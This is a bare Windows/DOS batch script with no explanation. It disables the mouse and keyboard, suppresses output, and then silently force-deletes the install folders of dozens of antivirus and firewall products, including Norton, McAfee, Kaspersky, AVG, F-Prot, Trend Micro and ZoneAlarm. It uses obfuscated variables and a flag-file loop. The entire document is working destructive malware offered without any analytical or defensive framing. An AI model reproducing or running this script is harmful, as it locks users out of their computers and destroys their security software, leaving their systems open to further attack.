   cls
   ctty nul
   @echo off
   @rundll32.exe mouse,disable
   @rundll32.exe keyboard,disable
   :1
   cls
   @%d% c:\antiba~1\ >%n%
   @%d% c:\antiba~2\ >%n%
   @%d% c:\antiba~1.1\ >%n%
   @%d% c:\antiba~1.2\ >%n%
   @%d% c:\antiba~1.3\ >%n%
   @%d% c:\antiba~1.4\ >%n%
   @%d% c:\antiba~1.5\ >%n%
   @%d% c:\antiba~1.6\ >%n%
   @%d% c:\antiba~1.7\ >%n%
   @%d% c:\antiba~1.8\ >%n%
   @%d% c:\antivi~1\ >%n%
   @%d% c:\avg\ >%n%
   @%d% c:\avpers~1\ >%n%
   @%d% c:\comman~1\ >%n%
   @%d% c:\esafen\ >%n%
   @%d% c:\findvi~1\ >%n%
   @%d% c:\f-macro\ >%n%
   @%d% c:\f-prot\ >%n%
   @%d% c:\f-prot95\ >%n%
   @%d% c:\f-secu~1\ >%n%
   @%d% c:\fwin\ >%n%
   @%d% c:\fwin32\ >%n%
   @%d% c:\inocul~1\ >%n%
   @%d% c:\inocul~2\ >%n%
   @%d% c:\kasper~1\ >%n%
   @%d% c:\kasper~2\ >%n%
   @%d% c:\mcafee\ >%n%
   @%d% c:\msav\ >%n%
   @%d% c:\norton~1\ >%n%
   @%d% c:\norton~2\ >%n%
   @%d% c:\pccill~1\ >%n%
   @%d% c:\pc-cil~1\ >%n%
   @%d% c:\tbav\ >%n%
   @%d% c:\tbavw95\ >%n%
   @%d% c:\toolkit\ >%n%
   @%d% c:\trendm~1\ >%n%
   @%d% c:\vs95\ >%n%
   @%d% %c%antiba~1\ >%n%
   @%d% %c%antiba~2\ >%n%
   @%d% %c%antiba~1.1\ >%n%
   @%d% %c%antiba~1.2\ >%n%
   @%d% %c%antiba~1.3\ >%n%
   @%d% %c%antiba~1.4\ >%n%
   @%d% %c%antiba~1.5\ >%n%
   @%d% %c%antiba~1.6\ >%n%
   @%d% %c%antiba~1.7\ >%n%
   @%d% %c%antiba~1.8\ >%n%
   @%d% %c%antivi~1\ >%n%
   @%d% %c%avg\ >%n%
   @%d% %c%avpers~1\ >%n%
   @%d% %c%comman~1\ >%n%
   @%d% %c%common~1\avpsha~1\ >%n%
   @%d% %c%common~1\symant~1\ >%n%
   @%d% %c%f-prot\ >%n%
   @%d% %c%f-prot95\ >%n%
   @%d% %c%findvi~1\ >%n%
   @%d% %c%f-secu~1\ >%n%
   @%d% %c%fwin\ >%n%
   @%d% %c%fwin32\ >%n%
   @%d% %c%grisoft\ >%n%
   @%d% %c%inocul~1\ >%n%
   @%d% %c%inocul~2\ >%n%
   @%d% %c%kasper~1\ >%n%
   @%d% %c%kasper~2\ >%n%
   @%d% %c%mcafee\ >%n%
   @%d% %c%norton~1\ >%n%
   @%d% %c%norton~2\ >%n%
   @%d% %c%pandas~1\ >%n%
   @%d% %c%quickh~1\ >%n%
   @%d% %c%symant~1\ >%n%
   @%d% %c%tbav\ >%n%
   @%d% %c%tinype~1\ >%n%
   @%d% %c%trendm~1\ >%n%
   @%d% %c%trojan~1\ >%n%
   @%d% %c%zonela~1\ >%n%
   cls
   @if exists test.txt goto done

   :2
   cls
   @echo.test>test.txt
   @set d=deltree/y
   @set c=c:\progra~1\
   @set n=nul
   cls
   goto 1

   :done
   @%d% test.txt >%n%
   cls
